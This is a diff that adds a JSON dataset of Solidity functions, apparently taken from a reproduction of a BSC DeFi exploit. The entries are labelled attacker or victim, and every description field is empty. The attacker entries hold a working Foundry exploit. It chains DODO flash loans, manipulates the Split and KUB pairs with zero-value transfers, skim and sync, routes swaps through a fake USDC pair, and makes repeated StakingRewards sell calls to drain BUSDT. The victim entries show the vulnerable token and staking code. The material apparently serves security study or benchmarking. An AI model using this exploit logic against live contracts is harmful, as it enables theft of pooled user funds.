@@ -1,0 +1,205 @@
+[
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "DPPFlashLoanCall",
+    "original_code": "    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {\n        if (abi.decode(data, (uint256)) == uint256(0)) {\n            DPPOracle2.flashLoan(0, BUSDT.balanceOf(address(DPPOracle2)), address(this), abi.encode(1));\n        } else if (abi.decode(data, (uint256)) == uint256(1)) {\n            DPPAdvanced.flashLoan(0, BUSDT.balanceOf(address(DPPAdvanced)), address(this), abi.encode(2));\n        } else if (abi.decode(data, (uint256)) == uint256(2)) {\n            DPPOracle3.flashLoan(0, BUSDT.balanceOf(address(DPPOracle3)), address(this), abi.encode(3));\n        } else if (abi.decode(data, (uint256)) == uint256(3)) {\n            DPP.flashLoan(0, BUSDT.balanceOf(address(DPP)), address(this), abi.encode(4));\n        } else {\n            BUSDT.approve(address(Router), type(uint256).max);\n            BUSDT.approve(address(StakingRewards1), type(uint256).max);\n\n            BUSDTToKUB();\n            KUB.transfer(address(KUB_Split), KUB.balanceOf(address(this)) - 10);\n            KUB_Split.sync();\n\n            BUSDTToSplit();\n            StakingRewards1.stake(address(KUB), address(BUSDT), address(BUSDT), upAddressForStake, 1000e18);\n\n            uint8 i;\n            while (i < 30) {\n                Split.transfer(address(this), 0);\n                ++i;\n            }\n\n            Split.transfer(address(BUSDT_Split), 0);\n            BUSDT_Split.skim(address(this));\n            Split.transfer(address(KUB_Split), 0);\n            KUB.transfer(address(KUB_Split), 1);\n            KUB_Split.skim(address(this));\n            Split.transfer(address(KUB_Split), 0);\n            KUB_Split.sync();\n            for (i = 0; i < 2; ++i) {\n                BUSDT_Split.skim(address(this));\n            }\n            // Amount of Split to send to pair later\n            uint256 amountSplit = Split.balanceOf(address(BUSDT_Split)) * 2;\n            // Exploit\n            // Creating pair with original fake USDC token deployed by attacker before\n            address fakeUSDC_Split = IUniswapV2Factory(Router.factory()).createPair(address(fakeUSDC), address(Split));\n            // Tx.origin must be exploiter eoa here (because original fake USDC contract is in use and exploiter addr is required to transfer)\n            vm.startPrank(address(this), exploiter);\n            // Send tokens to newly created token pair - USDC-Split\n            fakeUSDC.transfer(fakeUSDC_Split, 1e6);\n            Split.transfer(fakeUSDC_Split, amountSplit);\n            Uni_Pair_V2(fakeUSDC_Split).sync();\n\n            Split.setPair(address(fakeUSDC));\n            fakeUSDC.approve(address(Router), type(uint256).max);\n            // Swap fakeUSDC => Split => BUSDT\n            fakeUSDCToBUSDT();\n            vm.stopPrank();\n\n            Split.approve(address(StakingRewards2), type(uint256).max);\n            KUB.approve(address(StakingRewards1), type(uint256).max);\n\n            i = 0;\n            while (i < 100) {\n                (uint112 reserveKUB, uint112 reserveSplit,) = KUB_Split.getReserves();\n                uint256 amountOutKUB = calcAmountOut(KUB_Split, StakingRewards2, reserveKUB, KUB);\n\n                uint256 amountInSplit = PancakeRouter2.getAmountIn(amountOutKUB, reserveSplit, reserveKUB);\n\n                if (Split.balanceOf(address(this)) <= ((amountInSplit * 2) * 9) / 10) {\n                    StakingRewards2.sell(address(Split), address(KUB), amountInSplit);\n                } else {\n                    StakingRewards2.sell(address(Split), address(KUB), ((amountInSplit * 2) * 9) / 10);\n                }\n                ++i;\n            }\n\n            i = 0;\n            while (i < 10) {\n                (uint112 reserveBUSDT, uint112 reserveKUB,) = BUSDT_KUB_LP.getReserves();\n                uint256 amountOutBUSDT = calcAmountOut(BUSDT_KUB_LP, StakingRewards1, reserveBUSDT, BUSDT);\n                uint256 amountInKUB = PancakeRouter1.getAmountIn(amountOutBUSDT, reserveKUB, reserveBUSDT);\n\n                StakingRewards1.sell(address(KUB), address(BUSDT), amountInKUB);\n\n                ++i;\n            }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "IS_TEST",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "excludeArtifacts",
+    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "excludeContracts",
+    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "excludeSenders",
+    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "failed",
+    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "setUp",
+    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"bsc\", 32_021_100 - 1);\n        vm.label(address(BUSDT_KUB_LP), \"BUSDT_KUB_LP\");\n        vm.label(address(KUB_Split), \"KUB_Split\");\n        vm.label(address(BUSDT), \"BUSDT\");\n        vm.label(address(KUB), \"KUB\");\n        vm.label(address(Split), \"Split\");\n        vm.label(address(fakeUSDC), \"fakeUSDC\");\n        vm.label(address(DPPOracle1), \"DPPOracle1\");\n        vm.label(address(DPPOracle2), \"DPPOracle2\");\n        vm.label(address(DPPOracle3), \"DPPOracle3\");\n        vm.label(address(DPPAdvanced), \"DPPAdvanced\");\n        vm.label(address(DPP), \"DPP\");\n        vm.label(address(Router), \"Router\");\n        vm.label(address(PancakeRouter1), \"PancakeRouter1\");\n        vm.label(address(PancakeRouter2), \"PancakeRouter2\");\n        vm.label(address(StakingRewards1), \"StakingRewards1\");\n        vm.label(address(StakingRewards2), \"StakingRewards2\");\n        vm.label(BUSDT_KUB, \"BUSDT_KUB\");\n        vm.label(address(BUSDT_Split), \"BUSDT_Split\");\n        vm.label(upAddressForStake, \"upAddressForStake\");\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetArtifactSelectors",
+    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetArtifacts",
+    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetContracts",
+    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetInterfaces",
+    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetSelectors",
+    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetSenders",
+    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "testExploit",
+    "original_code": "    function testExploit() public {\n        deal(address(BUSDT), address(this), 0);\n        deal(address(fakeUSDC), address(this), 10_000 * 1e18);\n\n        emit log_named_decimal_uint(\n            \"Attacker BUSDT balance before attack\", BUSDT.balanceOf(address(this)), BUSDT.decimals()\n        );\n\n        emit log_named_decimal_uint(\"Attacker KUB balance before attack\", KUB.balanceOf(address(this)), KUB.decimals());\n\n        emit log_named_decimal_uint(\n            \"Attacker Split balance before attack\", Split.balanceOf(address(this)), Split.decimals()\n        );\n\n        BUSDT_KUB_LP.sync();\n\n        DPPOracle1.flashLoan(0, BUSDT.balanceOf(address(DPPOracle1)), address(this), abi.encode(0));\n\n        emit log_named_decimal_uint(\n            \"Attacker BUSDT balance after attack\", BUSDT.balanceOf(address(this)), BUSDT.decimals()\n        );\n\n        emit log_named_decimal_uint(\"Attacker KUB balance after attack\", KUB.balanceOf(address(this)), KUB.decimals());\n\n        emit log_named_decimal_uint(\n            \"Attacker Split balance after attack\", Split.balanceOf(address(this)), Split.decimals()\n        );\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ISplit",
+    "source_type": "victim_contract",
+    "function_name": "allowance",
+    "original_code": "    function allowance(address owner, address spender) public view virtual override returns (uint256) {\n        return _allowances[owner][spender];\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ISplit",
+    "source_type": "victim_contract",
+    "function_name": "approve",
+    "original_code": "    function approve(address spender, uint256 amount) public virtual override returns (bool) {\n        address owner = _msgSender();\n        _approve(owner, spender, amount);\n        return true;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ISplit",
+    "source_type": "victim_contract",
+    "function_name": "balanceOf",
+    "original_code": "    function balanceOf(address account) public view virtual override returns (uint256) {\n        return _balances[account];\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ISplit",
+    "source_type": "victim_contract",
+    "function_name": "decimals",
+    "original_code": "    function decimals() public view virtual override returns (uint8) {\n        return 18;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ISplit",
+    "source_type": "victim_contract",
+    "function_name": "deposit",
+    "original_code": "    function deposit() public payable {\n        balanceOf[msg.sender] += msg.value;\n        emit Deposit(msg.sender, msg.value);\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ISplit",
+    "source_type": "victim_contract",
+    "function_name": "name",
+    "original_code": "    function name() public view virtual override returns (string memory) {\n        return _name;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ISplit",
+    "source_type": "victim_contract",
+    "function_name": "owner",
+    "original_code": "    function owner() public view virtual returns (address) {\n        return _owner;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ISplit",
+    "source_type": "victim_contract",
+    "function_name": "setPair",
+    "original_code": "    function setPair(address token)public onlyOwner{\n        token1=token;\n        IERC20(token1).approve(address(router),uint(2**256-1));\n        pair=IFactory(router.factory()).getPair(token0, token1);\n    }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ISplit",
+    "source_type": "victim_contract",
+    "function_name": "symbol",
+    "original_code": "    function symbol() public view virtual override returns (string memory) {\n        return _symbol;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ISplit",
+    "source_type": "victim_contract",
+    "function_name": "totalSupply",
+    "original_code": "    function totalSupply() public view virtual override returns (uint256) {\n        return _totalSupply;\n    }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ISplit",
+    "source_type": "victim_contract",
+    "function_name": "transfer",
+    "original_code": "    function transfer(address to, uint256 amount) public virtual override returns (bool) {\n        address owner = _msgSender();\n        _transfer(owner, to, amount);\n        return true;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ISplit",
+    "source_type": "victim_contract",
+    "function_name": "transferFrom",
+    "original_code": "    function transferFrom(\n        address sender,\n        address recipient,\n        uint256 amount\n    ) external returns (bool);\n}\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ISplit",
+    "source_type": "victim_contract",
+    "function_name": "withdraw",
+    "original_code": "    function withdraw(uint256 wad) public {\n        require(balanceOf[msg.sender] >= wad);\n        balanceOf[msg.sender] -= wad;\n        payable(msg.sender).transfer(wad);\n        emit Withdrawal(msg.sender, wad);\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IStakingRewards",
+    "source_type": "victim_contract",
+    "function_name": "sell",
+    "original_code": "    function sell(address token,address token1,uint amount)public {\n        require(token != address(0) && token1 != address(0));\n        require(myReward[token] == token1);\n        require(users[token][msg.sender].tz >=100 ether);\n        require(listToken[token]);\n        require(PairToken[token1]);\n        bool isok=IERC20(token).transferFrom(msg.sender, address(this), amount);\n        require(isok);\n        address pair=ISwapFactory(IRouters.factory()).getPair(token,token1);\n        uint lp=IERC20(pair).balanceOf(address(this))*7/1000;\n        IERC20(pair).approve(address(address(IRouters)), lp);\n        uint totalSupply=IERC20(token).totalSupply()-IERC20(token).balanceOf(bunToken);\n        if(IERC20(token).totalSupply()/10 < totalSupply){\n           IERC20(token).transfer(bunToken,amount);\n        }\n        uint coin=amount*50/100;\n        uint _sellc=getTokenPriceSellc(token,token1,coin);\n        if(IERC20(token1).balanceOf(address(this)) < _sellc){\n           IRouters.removeLiquidity(token,token1,lp,0,0,address(this),block.timestamp+100);\n        }\n        require(IERC20(token1).balanceOf(address(this)) > _sellc && IERC20(token).balanceOf(address(this)) > coin);\n        IERC20(token1).transfer(msg.sender,_sellc);\n        IERC20(token).transfer(msg.sender,coin);\n    }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IStakingRewards",
+    "source_type": "victim_contract",
+    "function_name": "stake",
+    "original_code": "    function stake(address token,address token1,address token2,address up,uint amount) external{\n        require(users[token][up].tz > 0 || msg.sender == owner());\n        require(users[token][msg.sender].mnu <50);\n        require(PairToken[token1]);\n        require(PairToken[token2]);\n        require(myReward[token] == token1);\n        require(listToken[token]);\n        address pair=ISwapFactory(IRouters.factory()).getPair(token,token1);\n        require(pair!=address(this));\n        require(amount > 0,\"amount can not be 0\");\n        bool isok=IERC20(token2).transferFrom(msg.sender, address(this), amount);\n        require(isok);\n        if(upaddress[msg.sender] == address(0) && up != msg.sender){\n            upaddress[msg.sender]=update(pool).upaddress(msg.sender);\n        }\n        uint SELL=amount;\n        if(token1 != USDT && token2 ==USDT){\n          IERC20(token2).transfer(DEXpRICE,amount);\n          uint sellcx=update(DEXpRICE).claim(token1,USDT,amount);\n          require(sellcx > 0);\n           SELL=sellcx;\n        }\n        if(stakedOfTime[token][msg.sender] ==0){\n           stakedOfTime[token][msg.sender]=block.timestamp;\n        }else {\n           claim(token,token1);\n        }\n        users[token][msg.sender].mnu++;\n        IERC20(token1).transfer(auditor,SELL * 2 / 100);\n        IERC20(token1).transfer(TokenOwner[token],SELL * 1 / 100);\n        //TokenOwner[_token]\n      uint buyToken=_buy(token1,token,SELL * 49 / 100);\n      require(buyToken > 0);\n        _addL(token,token1,buyToken,SELL*48/100,address(this));       \n        stakedOfTimeSum[token][msg.sender][users[token][msg.sender].mnu]=RATE_DAY * 365;\n        stakedOf[token][msg.sender][users[token][msg.sender].mnu] += SELL;\n        stakedSum[token][address(this)]+=SELL;\n        if(upaddress[msg.sender] == address(0) && up != msg.sender){\n           upaddress[msg.sender]=up;\n           usersAddr[up].arrs.push(msg.sender);\n        }\n        users[token][msg.sender].tz+=SELL;\n    }\n",
+    "description": ""
+  }
+]
